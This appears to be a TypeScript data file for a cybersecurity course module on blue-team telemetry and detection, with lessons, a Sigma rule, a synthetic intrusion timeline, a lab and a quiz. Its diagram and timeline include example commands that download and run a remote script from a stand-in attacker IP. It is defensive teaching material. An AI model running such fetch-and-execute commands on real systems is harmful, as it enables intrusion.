import { ModuleData } from '../../types/course.types';

export const MODULE_7: ModuleData = {
  id: 'mod-07',
  courseId: 'practical-cybersecurity-teaming',
  slug: 'blue-team-foundations-telemetry-detection',
  title: 'Module 7 — Blue Team Foundations: Telemetry and Detection',
  track: 'blue',
  summary: 'Explore modern Security Operations Center (SOC) workflows, master event telemetry pipelines across endpoints and networks, design high-fidelity detection logic, and map coverage to ATT&CK.',
  orderIndex: 7,
  required: true,
  objectives: [
    'Describe the Security Operations Center (SOC) alert lifecycle from ingestion to resolution.',
    'Differentiate endpoint telemetry (EDR/Sysmon), identity audit logs, network flows, and application traces.',
    'Formulate high-fidelity detection rules that maximize signal-to-noise ratio and minimize false positives.',
    'Analyze synthetic event timelines to reconstruct adversary activity sequences.',
    'Assess detection engineering coverage gaps using ATT&CK data sources.'
  ],
  onePageCheatSheet: `### Module 7 Cheat Sheet: Telemetry & Detection Engineering
- **Telemetry Hierarchy:**
  - Endpoint (EDR/Sysmon): Process creation (Parent/Child), command-line arguments, network connections, file modifications.
  - Identity (IdP/AD): Auth attempts, MFA prompt responses, token grants, group membership changes.
  - Network (NetFlow/Zeek): Connection duration, bytes in/out, DNS lookups, TLS certificate metadata.
- **Detection Engineering Principle:** Detect behaviors and techniques, not brittle static indicators (IPs, hashes). Adversaries change IPs in seconds; changing their process execution technique requires engineering redesign.
- **Fidelity vs. Noise:** High-signal alerts = rare, high-confidence events with immediate operational context. Low-signal = high-volume generic events that trigger analyst burnout.`,
  lessons: [
    {
      id: 'lesson-07-01',
      moduleId: 'mod-07',
      slug: 'secops-roles-alert-lifecycle',
      title: '7.1 Security Operations Roles and the Alert Lifecycle',
      orderIndex: 1,
      estimatedMinutes: { reading: 12, practice: 15, total: 27 },
      level: 'intermediate',
      required: true,
      whyThisMatters: 'Security operations is a 24/7 team discipline. Understanding tiered roles, escalation paths, and the lifecycle of an alert prevents alerts from falling through cracks during high-pressure incidents.',
      objectives: [
        'Differentiate Tier 1 (Triage), Tier 2 (Investigation), and Tier 3 (Threat Hunting/IR) responsibilities.',
        'Track an alert from sensor ingestion through SIEM correlation, enrichment, triage, and ticket closure.',
        'Calculate operational metrics: Mean Time to Detect (MTTD) and Mean Time to Respond (MTTR).'
      ],
      prerequisites: ['lesson-02-04'],
      keyTerms: [
        { term: 'SIEM (Security Information & Event Management)', definition: 'A centralized software platform that aggregates, normalizes, correlates, and analyzes security logs from throughout an enterprise.' },
        { term: 'SOAR (Security Orchestration, Automation & Response)', definition: 'Technologies that enable organizations to execute automated playbooks and workflows in response to standard security alerts.' }
      ],
      sections: [
        {
          type: 'explanation',
          title: 'The Modern Security Operations Center (SOC)',
          content: `In a mature enterprise, security operations operates in coordinated tiers:
- **Tier 1 (Triage Analyst):** Monitors the incoming alert queue, validates whether an alert is a benign false positive or suspicious event, and escalates true anomalies within minutes.
- **Tier 2 (Incident Responder):** Conducts in-depth forensic investigation, scopes the lateral extent of an intrusion, and coordinates containment actions.
- **Tier 3 (Threat Hunter / Lead):** Proactively searches for stealthy adversaries that evaded automated detection rules and develops new detection logic.
- **Detection Engineer:** Authors, tests, tunes, and maintains detection rules in code (Detection-as-Code).`
        }
      ],
      summaryTakeaways: [
        'Alert triage requires rapid classification to protect analyst attention.',
        'Automation (SOAR) handles repetitive enrichment so humans can focus on critical reasoning.',
        'Detection engineers continually tune rules to eliminate false-positive fatigue.'
      ],
      references: [
        { title: 'Mitre Ten Strategies of a World-Class Cybersecurity Operations Center', publisher: 'The MITRE Corporation', url: 'https://www.mitre.org/news-insights/publication/ten-strategies-world-class-cybersecurity-operations-center', lastReviewed: '2026-01-10' }
      ],
      publishedAt: '2026-03-01',
      version: '1.0'
    },
    {
      id: 'lesson-07-02',
      moduleId: 'mod-07',
      slug: 'logs-events-timestamps-normalization-data-quality',
      title: '7.2 Logs, Events, Timestamps, Normalization & Data Quality',
      orderIndex: 2,
      estimatedMinutes: { reading: 14, practice: 20, total: 34 },
      level: 'intermediate',
      required: true,
      whyThisMatters: 'A SIEM is only as good as its raw data. Unsynchronized system clocks, missing fields, and unparsed logs make it impossible to correlate events across systems during an active investigation.',
      objectives: [
        'Explain why UTC synchronization (NTP) is mandatory across all enterprise logging infrastructure.',
        'Evaluate data normalization schemas like Elastic Common Schema (ECS) and Open Cybersecurity Schema Framework (OCSF).',
        'Identify log data loss, truncation, and retention failures.'
      ],
      prerequisites: ['lesson-07-01'],
      keyTerms: [
        { term: 'Log Normalization', definition: 'The process of parsing disparate log formats into a common schema with standardized field names (e.g., mapping `src_ip`, `SourceIp`, and `client_ip` all to `source.ip`).' },
        { term: 'NTP (Network Time Protocol)', definition: 'A networking protocol for clock synchronization between computer systems over packet-switched data networks.' }
      ],
      sections: [
        {
          type: 'explanation',
          title: 'The Foundation of Correlation: Schema and Time',
          content: `Imagine an attack where:
- Firewall logs a connection from 198.51.100.42 at \`14:02:10 UTC\`.
- Web server logs an HTTP POST request at \`14:02:11 UTC\`.
- Linux host logs a new process spawning \`/bin/bash\` at \`14:02:12 UTC\`.

If the web server\'s clock was 5 minutes slow, an analyst looking at events within a 30-second window would never correlate the connection with the process spawn.

**Golden Rule:** All log timestamps must be recorded in **UTC (Coordinated Universal Time)** with millisecond resolution.`
        }
      ],
      summaryTakeaways: [
        'Time synchronization (NTP) is a non-negotiable prerequisite for log correlation.',
        'Standardized schemas (OCSF, ECS) allow cross-platform querying.',
        'High-quality logs retain source IP, destination IP, user identity, and process hierarchy.'
      ],
      references: [
        { title: 'Open Cybersecurity Schema Framework (OCSF) Overview', publisher: 'Linux Foundation / OCSF', url: 'https://schema.ocsf.io/', lastReviewed: '2026-01-25' }
      ],
      publishedAt: '2026-03-01',
      version: '1.0'
    },
    {
      id: 'lesson-07-03',
      moduleId: 'mod-07',
      slug: 'endpoint-identity-network-app-telemetry',
      title: '7.3 Endpoint, Identity, Network & Application Telemetry',
      orderIndex: 3,
      estimatedMinutes: { reading: 15, practice: 20, total: 35 },
      level: 'intermediate',
      required: true,
      whyThisMatters: 'Adversaries operate across multiple technical planes. Relying solely on network firewalls leaves you blind to endpoint process injection; relying solely on endpoints leaves you blind to cloud API abuse.',
      objectives: [
        'Analyze Windows Event Logs (Security 4624/4688, Sysmon Event ID 1) and Linux Auditd process telemetry.',
        'Inspect cloud Identity Provider (IdP) audit events for anomalous token issuance.',
        'Differentiate packet payload inspection from flow metadata (NetFlow).'
      ],
      prerequisites: ['lesson-07-02'],
      keyTerms: [
        { term: 'Sysmon (System Monitor)', definition: 'A Windows system service and device driver that logs detailed process creation, network connections, and file modification events to the Windows event log.' },
        { term: 'Parent-Child Process Relationship', definition: 'The structural lineage showing which existing process spawned a new process (e.g., `nginx` spawning `/bin/bash` is a major anomaly).' }
      ],
      sections: [
        {
          type: 'diagram',
          title: 'Process Hierarchy Anomaly Detection',
          diagramAscii: `
  NORMAL WEB SERVER OPERATION:
  [systemd (PID 1)]
    └── [nginx: master process (PID 500)]
          └── [nginx: worker process (PID 501)]
                └── (Handles HTTP, reads static files, returns responses)

  SUSPICIOUS WEB SHELL ANOMALY:
  [systemd (PID 1)]
    └── [nginx: master process (PID 500)]
          └── [nginx: worker process (PID 501)]
                └── [/bin/sh (PID 1240)]  <-- CRITICAL ANOMALY!
                      └── [curl http://198.51.100.99/stage2.sh | bash]`,
          diagramAltText: 'ASCII diagram showing normal web server process tree versus an anomaly where nginx spawns a shell process.'
        }
      ],
      summaryTakeaways: [
        'Web servers should never spawn interactive command shells (`/bin/sh`, `powershell.exe`).',
        'Process parentage is one of the highest-fidelity detection signals on endpoints.',
        'NetFlow provides long-term communication records even when traffic is encrypted.'
      ],
      references: [
        { title: 'Microsoft Sysmon Documentation and Event IDs', publisher: 'Microsoft Learn', url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon', lastReviewed: '2026-02-01' }
      ],
      publishedAt: '2026-03-01',
      version: '1.0'
    },
    {
      id: 'lesson-07-04',
      moduleId: 'mod-07',
      slug: 'detection-logic-signal-context-false-positives',
      title: '7.4 Detection Logic: Signal, Context, False Positives & Gaps',
      orderIndex: 4,
      estimatedMinutes: { reading: 14, practice: 20, total: 34 },
      level: 'intermediate',
      required: true,
      whyThisMatters: 'Writing a detection rule that triggers 1,000 times a day causes analysts to ignore or disable it. High-quality detection engineering crafts precise logic that provides rich investigation context.',
      objectives: [
        'Write Sigma-style detection rules combining process names, command-line arguments, and parent relationships.',
        'Filter expected administrative activity using context-rich exclusions.',
        'Measure detection health using True Positive and False Positive ratios.'
      ],
      prerequisites: ['lesson-07-03'],
      keyTerms: [
        { term: 'Sigma', definition: 'A generic, open signature format allowing detection engineers to write once and convert rules to Splunk, Elastic, Sentinel, and other SIEM query languages.' },
        { term: 'Signal-to-Noise Ratio (SNR)', definition: 'The ratio of legitimate, actionable security alerts to harmless false positives or benign background notifications.' }
      ],
      sections: [
        {
          type: 'explanation',
          title: 'Writing High-Fidelity Detection Rules',
          content: `### Example Sigma Rule: Web Server Spawning Interactive Shell
\`\`\`yaml
title: Web Server Spawning Command Shell
id: b4f61e20-7e14-4e2a-9e8a-1b4a8e9f2a01
status: production
description: Detects an HTTP web server process spawning a shell interpreter, indicating a web shell or remote command execution.
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    ParentImage|endswith:
      - '/nginx'
      - '/apache2'
      - '/httpd'
      - '/php-fpm'
    Image|endswith:
      - '/sh'
      - '/bash'
      - '/dash'
      - '/python'
  condition: selection
level: critical
tags:
  - attack.initial_access
  - attack.t1190
\`\`\``
        }
      ],
      summaryTakeaways: [
        'Detect behaviors rather than transient IP addresses or hashes.',
        'Always combine suspicious child processes with their parent context.',
        'Every rule must be tagged with expected ATT&CK techniques and severity.'
      ],
      references: [
        { title: 'Sigma Specification & Rule Repository', publisher: 'SigmaHQ', url: 'https://github.com/SigmaHQ/sigma', lastReviewed: '2026-01-20' }
      ],
      publishedAt: '2026-03-01',
      version: '1.0'
    },
    {
      id: 'lesson-07-05',
      moduleId: 'mod-07',
      slug: 'attack-informed-detection-planning-timeline-practice',
      title: '7.5 ATT&CK-Informed Detection Planning & Event Timeline Practice',
      orderIndex: 5,
      estimatedMinutes: { reading: 15, practice: 25, total: 40 },
      level: 'intermediate',
      required: true,
      whyThisMatters: 'Reconstructing the timeline of an incident from fragmented log sources is the defining skill of a security analyst. You must correlate multi-source events into a coherent narrative of attacker behavior.',
      objectives: [
        'Analyze a multi-source synthetic event timeline spanning web, authentication, and endpoint logs.',
        'Sequence attacker actions chronologically and identify the root initial access event.',
        'Draft five targeted follow-up investigative questions for incident responders.'
      ],
      prerequisites: ['lesson-07-04'],
      keyTerms: [
        { term: 'Event Timeline', definition: 'A chronological sequence of normalized events synthesized from disparate log sources used to reconstruct the lifecycle of an intrusion.' }
      ],
      sections: [
        {
          type: 'example',
          exampleData: {
            title: 'Synthetic Incident Timeline: Intrusion on "Apex Dispatch Server"',
            datasetName: 'Apex-Event-Timeline-v1',
            scenario: 'You are analyzing 5 correlated log events captured during a suspected intrusion.',
            syntheticData: `[2026-10-14 11:20:01 UTC] [FIREWALL] TCP Connection from 198.51.100.99 to 10.200.0.10:443 (Bytes: 1420)
[2026-10-14 11:20:03 UTC] [NGINX ACCESS] POST /api/v1/dispatch/upload HTTP/1.1 (Status 200, File: "invoice.pdf.php")
[2026-10-14 11:20:05 UTC] [SYSMON LINUX] Parent: /usr/sbin/nginx | Child: /bin/sh | Command: "whoami" (UID 33 / www-data)
[2026-10-14 11:20:10 UTC] [SYSMON LINUX] Parent: /bin/sh | Child: /usr/bin/curl | Command: "curl http://198.51.100.99/drop.sh -o /tmp/k.sh"
[2026-10-14 11:20:14 UTC] [FIREWALL] Outbound TCP Connection from 10.200.0.10 to 198.51.100.99:8080 (ESTABLISHED)`,
            analysisWalkthrough: [
              'Event 1 & 2 (11:20:01 - 11:20:03): Initial Access via unrestricted file upload on `/api/v1/dispatch/upload` from external IP `198.51.100.99`. The file is named `invoice.pdf.php`.',
              'Event 3 (11:20:05): Execution of web shell. The web server process (`nginx`) spawned an interactive shell executing `whoami` under the `www-data` service account.',
              'Event 4 & 5 (11:20:10 - 11:20:14): Ingress Tool Transfer & Command and Control (C2). The attacker downloaded a second-stage payload to `/tmp/k.sh` and established an outbound TCP connection on port 8080.'
            ],
            keyInsight: 'Correlating web upload logs with endpoint process creation and outbound firewall connections proves code execution definitively.'
          }
        },
        {
          type: 'lab',
          labData: {
            id: 'lab-07-timeline-triage',
            title: 'Contained Lab: Event Timeline Reconstruction & Follow-Up Analysis',
            environmentName: 'Incident Timeline Triage Sandbox',
            scopeNotice: 'ATTENTION: Contained telemetry exercise. Analyze the provided synthetic intrusion timeline and formulate 3 critical investigative follow-up actions.',
            allowedActions: ['Inspect timeline timestamps', 'Tag ATT&CK techniques', 'Submit follow-up questions'],
            prohibitedActions: ['None - offline log analysis'],
            stopConditions: ['None'],
            initialState: { timelineReviewed: false },
            instructions: [
              'Review the 5 synthetic events from the Apex Dispatch breach.',
              'Identify the Initial Access vector (Unrestricted file upload).',
              'Formulate 3 key follow-up questions for containment (e.g., What processes were executed by /tmp/k.sh? Was the database accessed? Are other hosts communicating with 198.51.100.99?).'
            ],
            expectedResult: 'Timeline reconstructed with Initial Access identified and 3 verified containment questions submitted.',
            labType: 'timeline_triage'
          }
        }
      ],
      summaryTakeaways: [
        'An incident timeline tells the complete story across network, web, and endpoint planes.',
        'Initial access is often revealed by HTTP status codes and upload parameters.',
        'Outbound network connections following process execution indicate command-and-control staging.'
      ],
      references: [
        { title: 'The Practice of Network Security Monitoring', publisher: 'No Starch Press', url: 'https://nostarch.com/nsm', lastReviewed: '2026-01-15' }
      ],
      publishedAt: '2026-03-01',
      version: '1.0'
    }
  ],
  moduleQuiz: {
    id: 'quiz-mod-07',
    title: 'Module 7 Assessment: Telemetry & Detection Engineering',
    passingScore: 75,
    questions: [
      {
        id: 'q7-1',
        question: 'Why is parent-child process relationship telemetry considered one of the highest-fidelity detection signals in endpoint monitoring?',
        choices: [
          'Because parents and children always share the same file size.',
          'Legitimate enterprise software has predictable process parentage; anomalies (such as a web server or PDF viewer spawning a command prompt) reliably signal exploit execution or web shells.',
          'It eliminates the need for firewalls.',
          'It automatically encrypts the operating system.'
        ],
        correctIndex: 1,
        explanation: 'Web daemons or document viewers spawning `/bin/sh` or `cmd.exe` almost never occur during normal operations and represent high-confidence exploit indicators.'
      },
      {
        id: 'q7-2',
        question: 'Why is Network Time Protocol (NTP) synchronization across all logging servers considered a critical prerequisite for security operations?',
        choices: [
          'It saves disk space on log servers.',
          'It ensures that log events from firewalls, web servers, and domain controllers share an accurate, unified timeline, allowing multi-source event correlation during an investigation.',
          'It prevents attackers from guessing passwords.',
          'It automatically restarts crashed services.'
        ],
        correctIndex: 1,
        explanation: 'Accurate correlation of multi-system attack sequences requires synchronized timestamps (UTC) across all log sources.'
      },
      {
        id: 'q7-3',
        question: 'What is the primary operational consequence of deploying low-fidelity, noisy detection rules in a Security Operations Center?',
        choices: [
          'The SIEM database runs out of memory immediately.',
          'Analysts suffer from alert fatigue, become desensitized to high alert volumes, and miss genuine high-severity intrusions.',
          'Network bandwidth is cut in half.',
          'All user accounts are locked out.'
        ],
        correctIndex: 1,
        explanation: 'Alert fatigue caused by excessive false positives leads directly to ignored alerts and critical missed detections.'
      },
      {
        id: 'q7-4',
        question: 'In the provided incident timeline, what was the initial access vector used by the adversary?',
        choices: [
          'Brute-forcing an SSH password on port 22.',
          'Uploading an executable script (`invoice.pdf.php`) through an unvalidated file upload endpoint on the web server.',
          'Physical theft of a laptop from an employee\'s car.',
          'Phishing email sent to customer support.'
        ],
        correctIndex: 1,
        explanation: 'The timeline clearly showed an HTTP POST to `/api/v1/dispatch/upload` writing a `.php` file, immediately followed by the web server spawning a shell.'
      }
    ]
  }
};
